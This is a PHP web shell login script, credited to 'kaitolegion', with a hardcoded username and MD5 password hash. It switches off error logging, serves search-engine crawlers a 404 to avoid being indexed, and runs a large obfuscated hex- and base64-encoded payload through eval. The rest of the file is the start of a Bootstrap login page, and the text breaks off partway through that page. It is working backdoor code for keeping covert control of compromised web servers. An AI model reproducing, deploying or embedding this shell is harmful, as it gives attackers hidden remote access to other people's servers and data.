<?php
##
session_start();
error_reporting(0);
set_time_limit(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$username = "kaitolegion";
$password = "2bed2b4b57f7e7d57f56eb133da8c155"; // default: mr.kaitox
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", 
    	"Slurp", 
    	"MSNBot", 
    	"PycURL", 
    	"facebookexternalhit", 
    	"ia_archiver", 
    	"crawler", 
    	"Yandex", 
    	"Rambler", 
    	"Yahoo! Slurp", 
    	"YahooSeeker", 
    	"bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
if (isset($_GET['logout'])) {
	@logout();
}
function logout() {
	unset($_SESSION[@md5($_SERVER['HTTP_HOST'])]);
	@header("Location: http://".$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME']."");
}
error_reporting(0);
error_log(0);
eval(base64_decode("\x5a\x58\x5a\x68\x62\x43\x68\x6e\x65\x6d\x6c\x75\x5a\x6d\x78\x68\x64\x47\x55\x6f\x633\x52\x79\x58\x33\x4a\x76\x64\x44\x45\x7a\x4b\x47\x4a\x68c\x32\x55\x32\x4e\x46\x39\x6b\x5a\x57\x4e\x76\x5a\x47\x55\x6f\x4a\x30\x52\x6b\x57\x6c\x4e\x79\x63\x31\x64\x4a\x52\x6c\x46\x55\x55\x54\x56\x68\x55\x57\x70\x45\x4f\x48\x6c\x72\x61\x6b\x6f\x32\x57\x6d\x31\x54\x59\x33\x52\x4e\x65\x6b\x34\x33\x4f\x57\x5a\x73\x63\x55\x49\x32\x56\x31\x4d\x33\x63\x57\x35\x35\x56\x6a\x52\x6b\x4c\x7aZ\x78\x4b\x32\x52\x78\x61\x55\x55\x35\x65\x57\x34\x72\x65\x56\x70\x35\x4f\x45o\x33\x54\x69\x74\x70\x65\x6b\x39\x6c\x61\x53\x39\x49\x55\x53\x39\x30\x62\x69\x73\x7a\x4b\x31\x6c\x45\x55\x6d\x59v\x4e\x47\x70\x79\x5a\x32\x38\x34\x55\x31\x4a\x79\x4d\x57\x4e\x32\x59\x6c\x6f\x30\x55\x79\x38\x30\x51\x32\x30\x33\x61\x57\x5a\x53\x51\x58\x59\x78\x61\x33\x5a\x49a\x6c\x5a\x68\x56\x57\x39\x42\x65\x58\x70\x73\x4d\x6b\x46\x50\x5a\x45\x35\x45\x4e\x33\x63\x72\x61\x44\x4e\x54\x4f\x57\x52\x4a\x5a\x58\x52\x4b\x61\x46\x56\x6d\x52\x55\x74\x77\x54\x6c\x42\x51\x5a0\x68\x50\x64\x32\x31\x49\x59\x57\x74\x35\x53\x45\x31\x76\x59\x6a\x68\x47\x5a\x44\x42\x6c\x59\x32\x30\x78\x53\x48\x63\x32\x53\x43\x73\x32\x65\x45\x56\x58\x52\x56\x45\x77\x55\x47\x52\x44\x65\x45\x77\x7a\x54\x31\x41\x78\x64\x33c\x79\x54\x44\x56\x58\x62\x6b\x46\x52\x4d\x6c\x4e\x32\x57\x6e\x46\x78\x63\x45\x34\x77\x4d\x54\x450\x51\x6d\x67\x34\x62\x44\x56F\x4f\x57\x59\x32\x52z\x4a\x30\x62\x54\x68\x77\x64\x57\x78\x32\x56\x6c\x46\x4c\x5a\x33\x4a\x78\x65\x6c\x5a\x6b\x4e\x30\x31\x50\x53\x54\x4e\x78\x61\x57\x73\x35\x64\x55\x59\x31\x61\x6a\x52\x68\x62\x33\x4d\x76T\x32\x70\x6b\x55\x46\x6c\x45Z\x56\x63\x72\x62\x46\x4d\x72M\x69\x39\x4c\x4b\x30\x46\x49\x55\x45\x56\x78U\x6a\x45\x30\x63\x46\x70\x45\x57\x47\x4e\x4e\x64\x54\x4e\x46\x4f\x44\x59\x31\x56\x56\x67\x76\x65\x58\x56\x6d\x52\x47\x56T\x55\x47\x39\x6b\x4e\x6b\x46\x74\x51\x58\x42\x50\x65\x6b\x78\x78\x4d\x7a\x52\x31\x62\x32\x6c\x54\x61\x31\x6c\x4a\x54\x53\x73z\x57\x57\x39\x54\x62\x45\x31\x30\x5a\x32\x6b\x76\x4d\x6e\x4a\x57\x4f\x45\x39\x55\x4d\x32\x56\x45\x4d\x32\x70\x53\x64\x47\x4a\x35\x55\x54\x56\x46\x63\x58J\x30\x59\x33\x68\x57\x64\x45\x59\x34\x63\x6c\x70\x54\x53\x48\x68\x44\x4c\x30\x70\x46\x4e\x47\x35\x43\x4b\x33\x68\x45\x55\x7a\x46\x68\x52\x6d\x70\x54\x56\x32\x5a\x6e\x56\x55R\x57\x63\x6b\x4e\x53\x59\x54\x67\x79\x64j\x42\x4f\x57\x45\x35\x6a\x54\x6a\x68\x49\x64\x6e\x6c\x58\x65\x57\x5a\x48\x63\x30\x6f\x35\x4f\x43\x39\x52\x52\x33\x6c\x50\x5a\x55\x55\x78\x63\x30\x51\x31\x52\x55\x52\x74\x55\x53\x39\x56\x65\x6c\x56\x32\x56\x6d\x46\x76\x4b\x32\x70P\x5a\x6b\x46\x5a\x53\x48\x6c\x4e\x61\x56\x42\x43\x4d\x6b\x56\x46\x63\x58\x67\x31\x4d\x32\x4e\x30\x62\x47\x6c\x6b\x52\x6c\x4a\x6a\x4c\x7a\x55\x76R\x46\x70\x79\x61\x6d\x5a\x71L\x32\x39\x49\x4d\x57\x39L\x57\x6e\x42\x56\x55\x6a\x42\x72\x4e\x6dd\x6e\x57\x6b\x6c\x5a\x4e\x43\x39\x30\x54\x54\x56\x33\x4c\x32\x78J\x52\x6c\x6c\x49\x62\x44\x64\x77\x4c\x32\x78\x71\x53\x48\x6c\x33\x4f\x57\x73\x33\x5a\x45\x39\x35\x64\x30\x56\x74\x56\x6e\x5a\x78\x54\x6a\x56\x4aM\x6d\x4a\x6b\x63\x7a\x45\x34\x56\x6d\x64\x55\x64\x30\x4a\x54\x54\x48\x52\x47\x64\x48\x52\x6a\x61\x55\x70\x71\x4f\x58\x68\x71\x63\x47\x46\x35\x51\x32\x6c\x48\x56\x6e\x68\x47\x4e\x56\x70\x6e\x64\x56\x6b\x79\x55\x6d\x56\x55\x59\x32\x31\x45\x65\x56\x41\x76\x55\x54\x4ej\x56\x6d\x6c\x77\x53\x56\x49\x7a\x4d\x33d\x52\x57\x6a\x6c\x43\x51\x6d\x52P\x53\x6d\x6c\x6f\x54\x57\x46\x56\x52\x58\x70\x34\x4d\x6b\x6c\x79\x64\x6b\x78\x70\x57\x55\x52\x42\x4d\x33\x46\x69\x61\x48\x56\x5a\x62\x6e\x46\x6c\x4f\x57\x67\x35\x4c\x33\x52\x6a\x57\x53\x39\x4e\x65\x48\x5a\x42\x63\x57\x64\x4d\x55\x45\x68\x43\x5a\x6c\x56\x46\x4f\x45\x4a\x61\x53\x58\x56\x45\x61\x30\x6c\x51\x5a\x44\x5a\x51\x4d\x45\x56\x51\x52\x6e\x67\x72\x4d\x32\x6c\x55\x56\x58\x67\x79\x56\x6a\x49\x76\x5ajh\x52\x64\x6e\x68\x74\x64\x55\x74\x77\x57\x47\x55\x7a\x5a\x56\x46\x59\x55\x6a\x6c\x68\x62\x48\x5a\x58\x52\x48\x6bx\x54\x57\x64\x61\x4f\x47\x5a\x32\x54\x33\x46\x4f\x62\x69\x74\x59\x55\x6a\x49\x7a\x4f\x45\x38\x34\x61\x6a\x59\x78\x51\x6a\x4a\x45\x4d\x30\x31\x44\x53\x46\x6c\x72\x56\x7a\x46\x30\x4d\x6c\x46\x75\x55\x47\x4e\x74\x53\x6d\x39\x77\x4en\x45\x78\x53\x6a\x4a\x59\x63\x46\x56\x76\x62\x6c\x4a\x72\x57\x6b\x68\x78\x57W\x6c\x50\x62\x47\x4a\x57\x51\x33\x70\x56\x55\x6b\x39\x44\x5a\x47\x68\x74\x53\x56\x6f\x76\x5a\x55\x67\x7a\x64\x6c\x56\x5a\x63\x55\x46Z\x62\x58\x63\x72\x56\x56\x6f\x76\x55\x6d\x31\x31\x51\x6eh\x44\x52\x6e\x52\x56\x53\x30\x4e\x53\x64\x57\x4a\x50\x57\x6d\x4e\x43\x51\x31\x56\x48\x57\x6d\x6c\x53\x59\x57\x78\x76\x54\x31\x70\x46\x53\x32\x31\x72\x56\x30\x52\x44\x52\x33\x42\x73\x5a\x55\x68\x32\x51\x6a\x4e\x56\x4d\x79\x74\x69\x4e\x6a\x49\x32\x4d\x6c\x68\x59\x55\x32\x49\x78\x63\x57\x4d\x7a\x51\x6aN\x6f\x52\x33\x42\x52\x57\x55\x6c\x47\x4d\x6b\x46\x51\x62\x32\x55\x34\x57\x6d\x45\x78\x4f\x55\x5a\x71\x61\x7a\x46\x48\x51\x55\x6c\x47\x5a\x31\x45\x35\x53\x47\x52\x4a\x5a\x47\x35\x59\x54\x47\x6b\x78\x54\x56\x49\x7a\x53X\x51\x35\x55\x46\x64\x42\x59\x54\x5a\x6c\x55\x48\x64\x44\x5a\x56\x6f\x76\x5a\x44\x46\x6b\x56\x32\x56\x51\x56\x30\x78\x32\x53\x56\x68\x73\x52\x54\x68\x6b\x59\x32\x63\x35\x54\x6c\x5a\x35\x53\x6b\x30\x34\x55y\x74\x6d\x51\x7a\x68\x4d\x4f\x45\x68\x6c\x4d\x6d\x67\x34\x57\x55\x74\x46\x4f\x45\x6c\x4b\x65\x6d\x38\x34\x54\x32Z\x32\x56\x6a\x4a\x4a\x5a\x6a\x4a\x56\x64\x55\x46\x6b\x59\x32\x74\x31\x57\x55\x52\x42\x54\x6e\x64\x43\x55\x58\x49\x33\x53\x6d\x4a\x76\x63\x58\x42\x79\x59\x54\x5a\x42\x4f\x56\x64\x57\x52\x6c\x42\x48\x57\x53\x39\x55\x53\x6d\x39\x77\x5a\x30\x39\x59\x64\x31\x6b\x77\x5a\x32\x4d\x33\x63\x55\x68\x55\x54\x32\x46\x6b\x62\x6blW\x63\x48\x41\x35\x61\x6c\x49\x34\x54\x55\x4a\x69\x5aG\x70\x75\x59\x6a\x64\x47\x63\x45\x4d\x77\x54\x48\x52\x49\x62\x57\x4d\x33\x53\x32\x38\x77\x56\x6a\x51\x35\x61\x58\x4a\x47\x62\x31N\x51\x63\x58\x4a\x75\x54\x58\x70\x74\x55\x6e\x70\x46\x51\x56\x6c\x51\x57\x44\x6c\x44\x53\x6d\x78\x50\x62\x46\x70\x71\x64\x32\x5a\x54\x54\x54F\x58\x4e\x45\x68\x43\x65\x48\x70\x77\x51\x6b\x4a\x45T\x69\x74\x4d\x61\x32\x4e\x68\x4d\x47\x4e\x57\x5a\x48\x45\x7a\x59\x30\x78\x36\x4cz\x5a\x43\x62\x33\x4a\x72\x64\x57\x78\x54\x63\x6c\x70\x45\x4e\x6b\x56\x56\x54\x6d\x46\x61\x65\x6d\x4a\x69\x5a\x33\x4a\x79\x61\x32\x30\x35\x4d\x6d5\x79b\x58\x64\x61\x62\x57\x67\x72\x4d\x30\x35\x4c\x4e\x53\x74\x45\x55\x6c\x4a\x70\x54\x6aR\x4d\x54\x44\x6c\x36\x5a\x7a\x6c\x49\x53\x46\x64\x57\x56\x6a\x4a\x42\x56\x55\x64\x77\x64\x55\x78\x4e\x59W\x56\x4b\x56\x46\x6b\x77\x590\x52\x73\x65\x6b\x39\x78\x55\x47\x64\x75\x56\x31\x68\x47\x56\x57\x4e\x54\x5a\x47\x46\x72\x64\x55\x31\x34\x52\x31\x4a\x76\x623\x64q\x4d\x69\x39\x6d\x63\x47\x4a\x61\x54\x6c\x64\x4a\x61\x47\x59\x7a\x55\x31\x4e\x35\x4e\x47\x52\x54\x51\x55\x59\x72\x51\x6e\x70\x4c\x4d\x6b\x6b\x35\x63\x56\x4d\x30\x56\x47\x6c\x69\x64\x47\x45\x78\x4e\x45\x5a\x34\x64\x33\x56\x50\x5a\x44\x49\x34\x4d\x57\x74\x4a\x65\x57\x78\x43\x51\x6a\x56\x79\x56\x58\x68\x53\x54\x58\x46\x6c\x55\x31\x70\x7a\x57\x6d\x4a\x54\x63\x45\x6c\x46\x65W\x46\x74\x4d\x58\x68\x47\x65\x6d\x67\x78\x63\x6e\x5a\x6e\x55\x7a\x67\x31\x5a\x6a\x46\x46\x4d\x46\x4d\x7a\x51\x30\x46\x49\x63\x46\x52\x57\x62\x30\x46F\x53\x30d\x49\x4d\x7a\x4e\x6c\x59\x6b\x31\x57\x59\x32\x68\x4c\x65\x45\x74\x61\x52\x6c\x42\x52\x55\x54\x52\x53\x63\x6b\x45\x78\x63\x7a\x4e\x76\x54\x33\x46\x72\x63\x7a\x42\x35\x56\x32V\x68\x62\x6e\x64\x77\x4fG\x52\x4f\x4e\x54\x4a\x31\x55\x6b\x39\x33\x54\x46\x4e\x56\x51\x6d\x5a\x35\x54\x56\x4e\x71\x54\x46\x6b\x33W\x56\x64\x77\x55\x58\x4a\x7a\x4b\x33\x68\x53\x65\x55\x56\x68\x62\x7a\x67\x32\x52\x7a\x67\x79\x4e\x6dd\x6c\x63\x57\x31\x4c\x54\x6a\x56\x48\x53\x33\x68\x4cO\x54\x6b\x79\x53\x7a\x6c\x4c\x57\x6b\x56\x53\x51\x32\x78\x42\x54\x7a\x5a\x61\x62\x30Z\x36\x56\x58\x56\x4e\x51\x6d\x35\x4d\x51\x57\x56\x78\x4f\x45\x56\x73\x61\x31h\x58\x61\x45\x70\x53\x55\x31\x42\x73\x56\x33\x42\x73\x61\x44\x56\x59\x64\x45\x49\x30\x53\x48\x4e\x72\x4e\x6b\x70\x56\x63m\x4a\x42\x61\x45\x4a\x32\x65\x44\x4a\x59\x61\x6a\x6c\x76\x4d\x47\x31\x77\x52\x44\x6c\x6a\x57\x44\x4a\x68\x51\x55\x46\x77\x4f\x48\x5a\x6f\x59\x58\x6c\x56\x56\x33\x64\x46\x4d\x47\x51\x35\x4e\x6b\x64\x78\x56\x6b\x4dr\x59\x57\x4a\x4e\x5a\x31\x67\x32\x52\x57\x67\x72\x53\x45\x4a\x6b\x4d\x31\x52\x7aS\x46\x49\x78\x55\x57\x6b\x35\x4e\x30\x46\x69\x4f\x56\x4e\x50\x59\x6d\x35\x4b\x4f\x57\x64\x6c\x4d\x33\x42\x6a\x4f\x48\x70\x49d\x43\x74\x70\x55\x58\x5a\x54\x56\x6d\x6cM\x62\x6d\x5a\x30\x53\x33\x52\x6d\x52\x47\x68\x51\x55\x32\x78\x55\x5a\x6d\x5a\x45\x56\x69\x38\x7a\x51\x7a\x42\x78\x64\x55\x68\x51\x53\x57\x35\x61N\x46\x4e\x33\x55\x6a\x56\x43\x59\x6d\x39\x33\x4d\x55\x70\x61\x5an\x46\x74\x53\x32\x39L\x4d\x55\x70\x43\x62\x30\x51\x33\x59\x31\x52\x52\x53\x32\x4e\x68\x54\x32\x70\x49\x61\x6c\x56\x43\x4c\x31\x45\x31\x52\x44\x671\x65\x44\x4a\x57\x4d\x44\x52\x70\x57\x47\x38\x32\x4d\x6c\x45\x30\x53\x48\x4e\x4f\x5a\x55\x56\x69\x52\x54\x41\x35\x4d\x30\x4a\x32\x62\x47\x39\x34\x52\x58\x52\x68\x54\x6b\x78\x79\x51\x6e\x4a\x32\x61\x47\x4e\x32\x54j\x46v\x55\x43\x39\x49\x57j\x68\x71\x53\x55\x70\x59\x55\x48\x64\x5a\x64\x48\x4e\x36\x62\x32\x31\x34\x64\x44\x4a\x34\x64\x31\x46\x53\x4c\x7a\x56\x4dU\x45\x64\x75\x63\x6bp\x35\x53\x31\x4e\x73\x4d\x43\x39\x6c\x65\x45\x74\x57\x57\x54J\x53\x52\x31\x70\x5a\x52\x31\x42\x34\x4e\x47\x52\x57\x63\x30\x74\x74\x62n\x70\x36\x52\x55\x35\x49\x55\x32\x35\x47\x5a\x33c\x31\x59\x6d\x64\x78\x4f\x57\x5a\x73\x5a\x6d\x39\x31\x65\x55\x39\x69\x64\x57\x64\x35\x52\x6e\x6b\x30\x52\x6d\x68\x57\x53\x6b\x68\x50\x4e\x44\x52\x4d\x64\x55\x68\x36\x4e\x54\x4a\x75\x57\x57\x5a\x46\x53\x32\x6c\x78\x56\x45\x56\x53\x56\x6c\x51\x32\x61\x55\x49\x72\x57\x58\x42\x56\x63\x47\x59\x76\x55\x57\x45\x32\x4d\x55\x64\x72\x4c\x30\x70\x77\x52\x6e\x4a\x73\x55\x48\x56\x75\x56\x48\x42\x49\x61\x6d\x70\x70\x4d\x47\x56\x53\x64\x45\x4d\x31\x53\x30\x6c\x70\x64\x6b\x31\x57\x53\x53\x39\x4a\x51\x32\x70\x6c\x63\x47\x34\x76\x57\x45\x5a\x31\x55\x69\x74\x45\x64\x57\x67\x33\x64\x45\x5a\x4a\x4d\x7a\x4e\x31\x4d\x32\x4e\x42\x54V\x56\x75\x61\x55\x46\x4c\x4f\x57\x51\x30\x5a\x6d\x4e\x53\x61\x45\x52\x44\x52\x30\x46\x73\x53\x46\x4e\x48\x55\x6c\x52\x59\x55\x6d\x38\x34\x61\x47\x35\x72\x5a\x55\x45\x35\x4e\x7a\x46\x33\x65\x55\x64\x73\x62\x6c\x70\x74\x59\x54\x51\x31\x63\x56\x64\x4a\x53\x33\x5a\x73\x55\x6a\x5a\x6f\x64\x58\x68\x5a\x4c\x7a\x6c\x6b\x54\x54\x4dx\x56\x54\x42\x52\x55\x31\x64\x74\x59\x57\x38\x72\x5a\x30\x5az\x52\x43\x73\x78\x56\x33\x68\x31\x51\x55\x78\x69\x57\x6e\x68\x6c\x52\x6a\x68\x30\x4e\x7a\x46\x4d\x4c\x30\x46\x51\x52\x48\x4e\x35\x61\x58\x4a\x54\x59\x6d\x39\x6a\x57\x57\x39\x44\x55\x45\x52\x4c\x56\x33\x42\x6d\x51\x53\x39\x50\x52\x33\x42\x71\x4d\x58\x6c\x4a\x56\x6b\x35\x70\x63H\x6c\x45\x51\x6a\x52\x34\x4e\x6d\x64\x73\x54\x57\x4a\x5a\x54\x31\x46\x36\x4e\x6eJ\x53U\x45\x56\x75\x53\x55\x6c\x30\x54\x30\x4d\x78\x59\x6c\x68\x47\x57\x47\x78\x30\x64\x30\x78\x52\x52\x54\x6c\x61\x63\x32\x5a\x6c\x4d\x55p\x57\x61\x44\x64\x44\x56\x54\x4a\x70\x62\x6d\x46\x34\x5a\x56\x42\x4d\x52\x54\x4e\x6d\x4f\x55\x6c\x30\x56\x6b\x49\x34Y\x31\x42\x35\x5a\x7a\x49\x31\x4d\x69t\x77\x55\x6b\x74\x54\x52\x57\x74\x52\x59\x6e\x70\x6a\x4e\x6d\x78\x32Y\x56\x42\x43\x4d\x6d\x68\x34\x63\x30\x70\x75\x61\x6c\x4a\x35\x4e\x57\x68\x55\x57\x57\x78\x56\x63\x47\x52\x4e\x59\x6e\x46\x34\x64\x6c\x4e\x55\x5a\x6b\x35\x42\x61\x69\x74\x51\x56\x6b\x56\x56\x55\x54U\x35\x56z\x42\x51\x54\x33\x56\x33\x62\x48\x64\x4a\x64\x6c\x42\x69\x54\x47\x35\x5a\x55\x57\x6c\x42\x52\x47\x78\x77\x5a\x48\x52\x52\x51\x33\x5a\x30\x63W\x5a\x35d\x48\x56\x50R\x47\x35\x79\x52\x58\x70\x30\x53\x54\x63\x31\x4e\x30\x56\x57\x63\x44\x68\x4c\x63\x58\x6c\x50\x4d\x56\x67\x72\x4d\x6a\x56\x43\x51\x6e\x70\x6e\x4e\x47\x78\x4d\x62\x33\x42\x5a\x61\x33\x52\x51\x64\x55\x4e\x6a\x53\x54\x64\x43\x55\x47\x6b\x78\x55\x6c\x6c\x6d\x56\x58\x56\x77\x57\x46\x68\x55\x5a\x58\x42\x6c\x52\x57\x68\x48\x4d\x56\x4a\x59\x55\x48\x4e\x50\x4d\x48\x51\x32\x4e\x32\x56\x78\x4b\x32\x35\x4c\x54\x33\x4d\x76\x55\x30\x46\x48\x51\x56\x67\x31\x63\x47\x74\x75\x65\x48\x68\x34\x56\x46\x56\x4a\x62\x55\x56\x50\x63\x31\x4a\x6d\x53\x6e\x42\x54\x5a\x57\x5ah\x4e\x30\x78\x4e\x57\x44\x42X\x57\x56\x56\x72\x59\x57\x56\x7a\x52\x31\x56\x49\x59\x57\x64\x42b\x6b\x78n\x5a\x6d\x49\x34\x56\x6d\x39\x71\x52\x6b\x52\x32\x56\x32\x5a\x59\x4b\x7a\x41\x32\x51m\x78\x5a\x51\x57\x31\x75\x5a\x46\x46\x79\x55\x55\x78\x49\x4b\x33\x42\x61\x62\x44\x6c\x6b\x4d\x47\x4e\x31\x53\x56\x68\x32\x53\x56\x70\x6e\x5aV\x5a\x35\x54\x58\x63\x32\x64\x54\x5a\x51\x57\x54\x4e\x4d\x53\x56\x42\x4a\x61\x6b\x68\x36\x51\x55\x31\x6b\x65\x58\x70\x50\x4e\x47\x6c\x58\x55\x54\x46\x4a\x59\x58\x56\x58\x63\x6d\x5as\x63\x32\x35\x44\x62\x6e\x6br\x54\x6d\x70\x6e\x56\x56\x70\x72\x5a\x32\x49\x31\x63\x32\x6c\x53\x55\x6d\x39\x54\x62\x31M\x35\x61\x6a\x4e\x77\x4fV\x56\x75\x54\x56\x70\x57\x56\x33\x52U\x5a\x57\x6f\x34\x57\x56\x6c\x31\x65\x55\x5a\x71\x57\x55\x68\x77\x4d\x30\x31\x56\x64\x7a\x46\x47\x62\x6b\x4a\x31\x59\x6e\x4e\x77\x55\x57\x4e\x4a\x56\x6b\x74\x30\x56\x57\x5at\x57\x6c\x68\x50\x4c\x33\x42\x45\x65\x47\x64\x43\x4c\x32\x34\x34\x4f\x55\x742\x4e\x54\x5a\x55\x4dz\x42\x33\x4c\x33\x64\x79\x4e\x56\x6f\x78\x54\x55\x52\x33\x57\x44\x67\x31\x63\x31\x5a\x7a\x55\x55\x59\x34\x62\x6a\x5a\x68\x54\x44\x68\x59\x52\x6c\x64\x44\x4f\x43\x74\x7a\x4d\x33\x46\x45\x65\x6b\x64\x6dU\x54\x4e\x72\x4f\x55\x59\x35\x54\x33\x46\x4a\x64\x6d\x74\x34\x55\x55\x70\x69\x59\x6d\x63\x35\x52\x57\x70\x30\x56\x57\x70\x6a\x62\x45\x5a\x43\x61\x56\x63\x72\x5a\x47\x39\x4f\x59\x57\x70\x6a\x4d\x44\x51\x76\x61\x45\x46\x36\x59\x69\x74\x74\x63\x69\x73\x72M\x30\x46\x4b\x62\x55\x68\x4c\x4f\x58\x52\x75\x53\x48\x56\x4b\x56\x44\x51\x33\x65\x55\x68\x30\x52\x54\x59\x78\x59\x6c\x63\x78\x56\x55\x5a\x69\x52\x57\x35\x35\x51\x54\x4e\x47\x56\x31\x56\x53\x61\x32\x46\x5ae\x55\x74\x30\x4f\x58\x55\x72\x62\x44\x49\x72\x55\x6b\x70\x4d\x52\x56\x4e\x35\x64\x55\x78\x54V\x46\x4e\x79\x51\x58N\x33\x57\x56\x6c\x32\x65\x69\x74\x53\x59\x57\x64\x4f\x63\x55\x31v\x57\x56\x46\x45\x61\x48\x42\x71\x56\x45\x5a\x4e\x63\x55\x78\x54\x62n\x70\x49\x57\x53\x39\x78\x65\x6e\x4a\x45\x4f\x55\x68\x50\x61\x58\x70\x33\x54\x44\x52\x4bZ\x44\x56\x34\x62\x6c\x68\x6c\x4e\x47\x35\x73\x54\x56\x56\x70\x63\x6b\x31\x30\x5a\x55\x67\x33\x5a\x6e\x6c\x77\x4f\x46\x64\x77\x64\x6b\x74\x61\x52\x55\x63\x7a\x57\x55\x68\x6e\x4e\x7a\x56R\x63\x44\x41\x30\x4e\x47\x74\x46\x57\x57\x31\x75\x64\x46\x70\x58\x4d\x31\x46\x33e\x57\x6f\x31\x4d\x30\x70\x45\x61\x56\x49\x32\x51\x6d\x35\x69\x5a\x30\x52\x4f\x5a\x55\x68\x47\x61\x47\x68\x4f\x55\x6c\x41\x79\x54\x32\x46\x59\x4d\x45\x52\x78\x52\x54\x64\x6c\x59\x6d\x74\x57\x51\x33\x4a\x55\x61\x6d\x39\x57\x4e\x6b\x5a\x47\x5a\x6c\x67\x33\x4e\x54\x4e\x50\x64\x58\x4e\x52\x59\x30\x6c\x56\x4e\x6d\x68\x56\x4d\x57\x4a\x53\x64\x58\x70\x6b\x64\x45\x64\x30\x52\x44\x51\x76\x61\x7a\x49\x76\x4e\x54\x55\x35\x65\x47\x4e\x75\x62\x56\x42\x31\x61\x45\x31\x4bN\x44\x6c\x30\x55\x6b\x31\x49b\x31\x5a\x59\x5a\x33\x46\x36\x65\x57\x68\x53\x62\x58\x6c\x56\x51\x55\x4ao\x55\x43\x38v\x63\x44\x46\x57\x62\x45\x39\x4d\x64\x54\x56\x61\x4e\x6dh\x36\x54\x6c\x55\x79\x5a\x44\x68\x58\x57\x6b\x34\x35\x51\x6c\x5a\x4f\x4d\x45\x56\x7a\x54\x55\x68\x61\x56\x30\x6c\x61\x55\x6c\x42\x31\x5a\x58\x6f\x33\x54\x6d\x4a\x47\x4c\x33\x4d\x72\x4fX\x4d\x7a\x65\x6c\x5a\x52\x61\x43\x74\x4f\x61\x58\x51\x32\x61\x57\x68\x55\x4e\x6c\x55\x35\x62\x32\x5a\x42\x64\x30\x4e\x4c\x62\x44\x42\x74\x61\x57\x30\x35\x4f\x44\x4e\x77\x54\x33\x6c\x58\x5a\x6b\x31\x70\x53\x6e\x64\x36\x56\x6e\x67\x72\x4e\x45\x35\x55\x51\x56\x68\x43\x560\x51\x35\x53\x6b\x68\x70\x5a\x69\x74\x4e\x5a\x48\x42\x71\x64\x6b\x68y\x64\x47\x74\x34\x53\x30\x6c\x72\x57\x46\x6c\x74\x55\x6b\x70\x79\x64\x7a\x68\x33\x53\x43\x74\x6e\x55\x58\x46\x4ea\x48\x63\x77\x64\x45\x46\x6b\x56\x46N\x4c\x65\x58\x6c\x57\x62\x6b\x35\x6d\x4e\x6c\x52\x43\x53\x46\x46\x35\x55\x30\x31\x75\x55\x57\x6c\x77\x52\x33\x52\x35\x4e\x6b\x5a\x30\x62\x31\x70\x7a\x5a\x54\x4a\x4a\x52\x55V\x32NT\x6c\x33\x5aG\x67\x31\x4d\x58\x64\x4b\x54\x58\x68\x33\x64\x55\x39\x78\x56\x55\x64\x73\x4d\x7a\x67\x7a\x59\x6b\x5a\x6b\x5a\x31\x52\x68\x61\x6e\x67\x31\x62\x44\x56\x5a\x62\x47\x6c\x49\x65\x46\x70\x43\x4d\x47\x39\x35\x4e\x32\x74\x49\x52\x56\x46\x6d\x52\x55\x4e\x6c\x4d\x32\x4a\x32\x63\x58\x42\x56\x52V\x67\x30\x4f\x47\x4a0\x57\x6e\x46\x6c\x62\x48\x59\x31\x4d\x48\x68\x43\x4d\x6b\x4e\x4e\x64\x47\x74\x44\x4d\x6c\x41\x78\x4d\x6c\x52\x58\x4e\x55\x4e\x43\x54\x32\x74\x61\x59\x7a\x42\x55\x63\x47\x4e\x76\x4e\x55\x46\x42\x63\x55\x64\x4a\x62\x46\x46\x7a\x61\x6e\x55\x35\x52\x32\x5a\x50\x61\x31\x5a\x76\x63\x79\x74\x56\x55\x55\x35\x75\x4d\x7a\x4e\x74\x64\x32\x4e\x76\x52\x46\x42\x4e\x56\x32\x4e\x78\x56\x30\x704\x54\x57\x68\x43\x4e\x7a\x4eD\x52\x33\x70\x76\x59\x33\x52\x59\x65\x58\x42\x32\x61\x46\x4e\x6e\x54\x6e\x6c\x59\x56\x6e\x42\x55\x56\x57\x46\x79\x4e\x6e\x70\x59\x57\x58\x55\x31\x4d\x31\x46\x74\x4e\x6b\x64\x55\x63\x6b\x4d\x33\x52\x6a\x56\x42\x55\x6a\x56\x32\x62\x6a\x56\x57\x52\x54\x46\x59\x62\x45\x49\x30\x52\x53\x74\x56\x5a\x57\x39\x49\x62\x56\x4a\x75\x65\x57\x73\x32\x51\x6e\x6c\x31\x62\x7a\x46\x72\x53\x55\x5a\x75\x54\x58\x70E\x64G\x6f\x31\x61\x7a\x56\x4c\x52\x6e\x46\x54\x53\x55\x6c\x44\x56\x46\x6c\x4a\x62\x55\x4e\x73\x55\x43\x74\x6d\x4c\x79\x38\x33\x5a\x43\x38\x76N\x46\x41\x6e\x4b\x53\x6b\x70\x4b\x54\x73\x3d"));
// Function Login Shell
function login_shell() {
?>
<link rel="icon" href="http://www.iconarchive.com/download/i91933/icons8/windows-8/User-Interface-Login.ico" sizes="32x32" >
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
<title>LOG IN</title>
<style type="text/css">
	img.logout {
		padding:5px;
	} input[type=password],input[type=text].logout {
		width:250px;
		text-align:center;
	} input[type=submit],input[type=text].logout {
		width:250px;
		text-align:center;
		margin:5px;
	} span.logout {
		color:#999999;
	} h2 {
		font-family: monospace;
    }
</style>
            <center>
            <br>
            <br>
            <img src="https://avatars0.githubusercontent.com/u/32727560?s=400&v=4" class="logout">
